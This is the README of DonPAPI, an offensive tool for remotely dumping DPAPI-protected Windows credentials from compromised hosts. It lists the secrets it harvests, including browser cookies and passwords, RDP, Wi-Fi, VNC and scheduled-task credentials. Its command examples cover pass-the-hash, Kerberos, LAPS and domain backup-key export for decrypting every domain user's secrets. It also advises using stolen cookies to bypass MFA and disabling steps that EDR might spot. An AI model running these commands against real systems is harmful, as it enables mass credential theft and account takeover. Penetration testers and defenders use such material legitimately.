# DonPAPI

Dumping revelant information on compromised targets without AV detection
![alt text](https://github.com/login-securite/DonPAPI/blob/main/res/Logo%20DonPapi.png)


## DPAPI dumping

Lots of credentials are protected by [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection).

We aim at locating those "secured" credentials, and retrieve them using :

- User password
- Domaine DPAPI BackupKey
- Local machine DPAPI Key (protecting `TaskScheduled` blob)

## Curently gathered info

- Windows credentials (Taskscheduled credentials & a lot more)
- Windows Vaults
- Windows RDP credentials 
- AdConnect (still require a manual operation)
- Wifi key
- Internet explorer Credentials
- Chrome cookies & credentials
- Firefox cookies & credentials
- VNC passwords
- mRemoteNG password (with default config)

## Check for a bit of compliance

- SMB signing status
- OS/Domain/Hostname/Ip of the audited scope

## Operational use

With local admin account on a host, we can :

- Gather machine protected DPAPI secrets
  - ScheduledTask that will contain cleartext login/password of the account configured to run the task
  - Wi-Fi passwords
- Extract Masterkey's hash value for every user profiles (masterkeys beeing protected by the user's password, let's try to crack them with Hashcat)
- Identify who is connected from where, in order to identify admin's personal computers. 
- Extract other non-dpapi protected secrets (VNC/Firefox/mRemoteNG)
- Gather protected secrets from IE, Chrome, Firefox and start reaching the Azure tenant.

With a user password, or the domain PVK we can unprotect the user's DPAPI secrets.  

- Use cookies to bypass MFA (https://www.eshlomo.us/pass-the-cookie-crumble-the-cloud/)

## Examples
### Authenticate with 

Dump all secrets of the target machine with an Domain admin account : 

```bash
DonPAPI.py domain/user:passw0rd@target
```
or a Local one : 
```
DonPAPI.py -local_auth user@target
```
Using PtH

```bash
DonPAPI.py --hashes <LM>:<NT> domain/user@target
```

Using kerberos (-k)

```bash
DonPAPI.py -k domain/user@target
```

Using a user with LAPS password reading rights

```bash
DonPAPI.py -laps domain/user:passw0rd@target
```

Using relayed socks :  
![HackndoRealying](https://pbs.twimg.com/media/FAnPpHjX0AE16r9?format=jpg&name=medium)

### Decrypt secrets 

to decrypt secrets DonPapi might need :
- Nothing, when facing reversible encryption (firefox, mremoteNG, VNC)
- the machine DPAPI Key, we will fetch it automatically thanks to secretdumps when having an admin acces (Wifi, scheduled task passwords)
- the user password for everything related to DPAPI Protection, or de DPAPI Domain Backup key

It is possible to provide a list of credentials that will be tested on the target. DonPAPI will try to use them to decipher masterkeys.

This credential file must have the following syntax:

```plain
user1:pass1
user1:pass2
user2:passX
...
```

```bash
DonPAPI.py -credz credz_file.txt domain/user:passw0rd@target
```

When a domain admin user is available, it is possible to dump the domain backup key using impacket `dpapi.py` tool: 

```bash
dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
```

This backup key (pvk file) can then be used to dump all domain user's secrets!

`python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list`

### Select targets
Target can be an IP, IP range, CIDR, FQDN, file containing list targets (one per line)

## Reports & raw data
DonPapi will extract and consolidate a bunch of raw information 
- raw user and passwords in 'raw_credz' 
- raw cookies 
- raw sam hash
- raw users masterkey's hash (Good luck with cracking those, but it might be the only hash you'll get for some SuperAdmin Accounts)
- raw DCC2

HTML Reports will be created, as you'll probably have so many passwords that your browser will crash rendering it, i tried to separate those in few reports.

Cookies are great to bypass MFA, by clicking on a cookie in the report you'll copy what you need to paste to cookie in your browser dev console.

some info are excluded from the reports, you can still acces all the data in the sqlite3 donpapi.db database.


## Opsec consideration

The RemoteOps part can be spoted by some EDR (it's basically a secretdump). It can be disabled using `--no_remoteops` flag, but then the machine DPAPI key won't be retrieved, and scheduled task credentials/Wi-Fi passwords won't be harvested. 

## Installation

```
git clone https://github.com/login-securite/DonPAPI.git
cd DonPAPI
python3 -m pip install -r requirements.txt
python3 DonPAPI.py
```

or

```
git clone https://github.com/login-securite/DonPAPI.git
cd DonPAPI
poetry install
poetry run donpapi
```

## Credits

All the credits goes to these great guys for doing the hard research & coding :

- Benjamin Delpy ([@gentilkiwi](https://twitter.com/gentilkiwi)) for most of the DPAPI research (always greatly commented, <3 your code)
- Alberto Solino ([@agsolino](https://twitter.com/agsolino)) for the tremendous work of Impacket (https://github.com/SecureAuthCorp/impacket). Almost everything we do here comes from impacket. 
- [Alesandro Z](https://github.com/AlessandroZ) & everyone who worked on Lazagne (https://github.com/AlessandroZ/LaZagne/wiki) for the VNC & Firefox modules, and most likely for a lots of other ones in the futur. 
- dirkjanm [@_dirkjan](https://twitter.com/_dirkjan) for the base code of adconnect dump (https://github.com/fox-it/adconnectdump) & every research he ever did. I learned so much on so many subjects thanks to you. <3
- [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) for CME (lots of inspiration and code comes from CME : https://github.com/byt3bl33d3r/CrackMapExec )
- All the Team at [@LoginSecurite](https://twitter.com/LoginSecurite) for their help in debugging my shity code (special thanks to [@layno](https://github.com/clayno) & [@HackAndDo](https://twitter.com/HackAndDo) for that)

## Todo

- Finish ADSync/ADConnect password extraction
- CREDHISTORY full extraction
- Extract windows Certificates
- Further analysis ADAL/msteams
- Implement Chrome <v80 decoder
- Find a way to implement Lazagne's great modules

# Changelog

  ```
  v1.0
  ----
  Initial release
  ```
